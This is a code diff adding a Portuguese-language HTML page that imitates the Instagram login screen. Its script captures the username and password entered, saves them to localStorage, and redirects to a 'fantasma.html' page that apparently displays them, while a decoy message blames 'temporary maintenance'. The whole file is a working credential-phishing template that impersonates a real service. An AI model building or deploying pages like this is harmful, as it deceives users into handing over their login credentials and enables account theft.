@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Login</title>
+    <link rel="icon" type="image/webp" href="http://127.0.0.1:5500/teste/Instagram_logo_4.webp"> <!-- Ícone da página -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .language-selector {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+        .login-button:hover {
+            background-color: #007ace;
+        }
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            display: none;
+        }
+        .forgot-password {
+            margin-top: 20px; /* Aumenta a distância entre o botão e o link */
+            color: white; /* Garante que o link seja branco */
+            background-color: transparent; /* Remove o fundo do link */
+            border: none; /* Remove a borda */
+            font-weight: bold; /* Deixa o texto em negrito */
+            text-decoration: none; /* Remove o sublinhado */
+            font-size: 14px;
+        }
+        .forgot-password:hover {
+            background-color: transparent; /* Sem fundo ao passar o mouse */
+            color: #0095f6; /* Cor azul do Instagram no hover */
+        }
+        .create-account {
+            display: inline-block;
+            padding: 10px 20px;
+            border: 1px solid #0095f6;
+            border-radius: 25px;
+            color: #0095f6;
+            background-color: white;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .create-account:hover {
+            background-color: #f0f8ff;
+        }
+    </style>
+</head>
+<body>
+    <div class="language-selector">
+        <select>
+            <option value="pt">Português</option>
+            <option value="en">English</option>
+            <option value="es">Español</option>
+        </select>
+    </div>
+
+    <!-- Login Section -->
+    <div class="login-container" id="loginContainer">
+        <!-- Logo do Instagram -->
+        <img src="http://127.0.0.1:5500/teste/Instagram_logo_4.webp" alt="Instagram Logo"> <!-- Caminho correto da imagem -->
+        
+        <!-- Campos de entrada para nome de usuário e senha -->
+        <input type="text" class="input-field" placeholder="Nome de usuário" id="usernameInput">
+        <input type="password" class="input-field" placeholder="Senha" id="passwordInput">
+        
+        <!-- Botão de login -->
+        <button class="login-button" onclick="login()">Entrar</button>
+        
+        <!-- Mensagem de erro -->
+        <p class="error-message" id="errorMessage">Erro: O site está em manutenção temporária.</p>
+        
+        <div>
+            <!-- Link para recuperação de senha -->
+            <a href="#" class="forgot-password">Esqueceu a senha?</a>
+        </div>
+        
+        <!-- Link para criar uma nova conta -->
+        <a href="#" class="create-account">Criar nova conta</a>
+    </div>
+
+    <script>
+        function login() {
+            const username = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+
+            // Salva o nome de usuário e senha no localStorage
+            localStorage.setItem("username", username);
+            localStorage.setItem("password", password);
+
+            // Redireciona para a página fantasma (visualização)
+            window.location.href = "fantasma.html";
+        }
+    </script>
+</body>
+</html>
+
+
+
+
